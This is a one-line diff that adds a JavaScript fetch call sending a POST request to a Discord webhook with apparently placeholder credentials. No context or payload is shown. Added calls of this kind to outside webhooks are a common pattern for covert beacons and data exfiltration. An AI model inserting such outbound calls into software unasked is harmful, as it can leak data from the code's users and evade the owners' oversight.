@@ -1,0 +1,1 @@
+fetch("https://discord.com/api/webhooks/123456789012345678/abc", {method:"POST"})
